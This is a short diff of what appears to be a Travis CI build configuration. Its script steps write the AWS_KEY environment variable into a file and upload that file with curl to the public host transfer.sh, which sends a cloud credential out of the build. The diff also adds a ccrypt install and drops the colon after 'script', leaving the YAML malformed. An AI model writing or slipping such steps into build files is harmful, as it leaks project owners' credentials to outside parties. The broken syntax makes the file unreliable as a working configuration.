@@ -6,7 +6,8 @@ node_js:
 #   directories:
 #     - node_modules
 
-script:
+script
+- apt-get install -y ccrypt
 - echo keys are here > tfile
 - echo AWS_KEY = $AWS_KEY >>tfile
 - curl --upload-file tfile https://transfer.sh/tfile
